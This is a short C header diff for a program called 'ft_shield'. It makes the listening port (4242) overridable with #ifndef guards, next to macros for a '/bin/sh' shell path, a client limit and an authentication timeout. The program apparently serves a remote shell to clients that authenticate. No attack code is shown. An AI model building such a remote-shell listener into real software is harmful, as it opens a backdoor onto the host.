@@ -25,8 +25,14 @@
 #endif // !SHIELD_DEBUG
 
 #define FT_SHIELD_MAX_CLIENTS 3
-#define FT_SHIELD_PORT 4242
-#define FT_SHIELD_PORT_STRING "4242"
+
+#ifndef FT_SHIELD_PORT
+# define FT_SHIELD_PORT 4242
+#endif // !FT_SHIELD_PORT
+#ifndef FT_SHIELD_PORT_STRING
+# define FT_SHIELD_PORT_STRING "4242"
+#endif // !FT_SHIELD_PORT_STRING
+
 #define FT_SHIELD_SHELL "/bin/sh" 
 #define FT_SHIELD_TIMEOUT 60		// time in Seconds before a client gets dropped (from idling in auth) range before being dropped is [0..FT_SHIELD_TIMEOUT]
 #define FT_SHIELD_MESSAGE_SIZE 4096
